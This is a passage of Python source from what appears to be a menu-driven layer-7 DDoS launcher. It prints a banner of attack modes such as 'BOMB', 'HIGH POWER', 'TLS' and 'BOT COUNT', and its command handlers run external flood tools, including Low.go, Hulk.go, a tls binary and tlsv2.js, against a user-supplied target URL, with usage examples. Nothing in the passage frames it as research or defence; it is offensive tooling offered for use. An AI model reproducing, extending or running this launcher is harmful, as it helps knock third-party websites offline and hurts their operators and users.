...
""")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m╔═════════════════════════════════════════════════════╗\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mBOMB     "+Fore.LIGHTCYAN_EX+">>>"+Fore.LIGHTWHITE_EX+" \33[0;32mLOW POWER                            "+Fore.LIGHTCYAN_EX+"\033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mBOMB2    "+Fore.LIGHTCYAN_EX+">>>"+Fore.LIGHTWHITE_EX+" \33[0;32mHIGH POWER                           "+Fore.LIGHTCYAN_EX+"\033[1;31;40m║\n")
    ...
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mTLS      "+Fore.LIGHTCYAN_EX+">>>"+Fore.LIGHTWHITE_EX+" \33[0;32mONLY VPS KALI                        "+Fore.LIGHTCYAN_EX+"\033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mTLSV2    "+Fore.LIGHTCYAN_EX+">>>"+Fore.LIGHTWHITE_EX+" \33[0;32mONLY TERMUX                          "+Fore.LIGHTCYAN_EX+"\033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mBRUTAL   "+Fore.LIGHTCYAN_EX+">>>"+Fore.LIGHTWHITE_EX+" \33[0;32mBOT COUNT                            "+Fore.LIGHTCYAN_EX+"\033[1;31;40m║\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m╚═════════════════════════════════════════════════════╝\n")
    stdout.write("\n")
##############################################################################################
def layer7():
...
\033[1;34;40m└─\033[1;31;40m# """+Fore.WHITE)
    ...
    if command == "cls" or command == "clear":
        ...
        special()
            ...
            try:
                ...
                os.system(f'cd resources && go run Low.go -site {target} -data {methods}')
            except IndexError:
                print('Usage: bomb URL METHODS GET/POST')
                print('Example: bomb http://target.com GET')
    elif command == "BOMB2" or command == "bomb2":
            try:
                target, methods = get_info_sp()
                os.system(f'cd resources && go run Hulk.go -site {target} -data {methods}')
            except IndexError:
                print('Usage: bomb2 URL METHODS GET/POST')
                print('Example: bomb2 http://target.com GET')
    ...
    elif command == "BRUTAL" or command == "brutal":
            try:
                os.system("cd randomstring && python3 input.py")
            except IndexError:
                print('type with true command')
    elif command == "TLS" or command == "tls":
            try:
                ttarget, ttime = get_info_tls()
                os.system(f'cd resources && ./tls {ttarget} {ttime} 6 6')
            except IndexError:
                print('Usage: TLS URL REQ THREAD')
                print('Example: tls http://target.com 500')
    elif command == "TLSV2" or command == "tlsv2":
            try:
                ttarget, ttime = get_info_tls()
                os.system(f'cd resources && node tlsv2.js {ttarget} {ttime} 8 5')
            except IndexError:
                print('Usage: TLS URL REQ THREAD')
                print('Example: tlsv2 http://target.com 500')
